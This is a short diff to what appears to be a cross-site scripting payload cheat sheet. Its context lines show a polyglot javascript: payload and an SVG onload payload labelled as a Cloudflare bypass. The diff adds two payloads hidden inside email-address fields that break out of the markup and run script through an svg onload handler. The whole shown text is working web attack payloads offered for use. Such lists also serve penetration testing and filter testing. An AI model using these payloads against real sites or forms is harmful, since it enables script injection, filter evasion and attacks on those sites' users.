@@ -488,6 +488,11 @@ jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</t
 PAYLOAD:
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 
+     Email 
+
+“><svg/onload=confirm(1)>”@gmail.com     
+  "><svg/onload=confirm(1)>"@x.y 
+
 
 🌐ColdFusion  XSS
 POC:
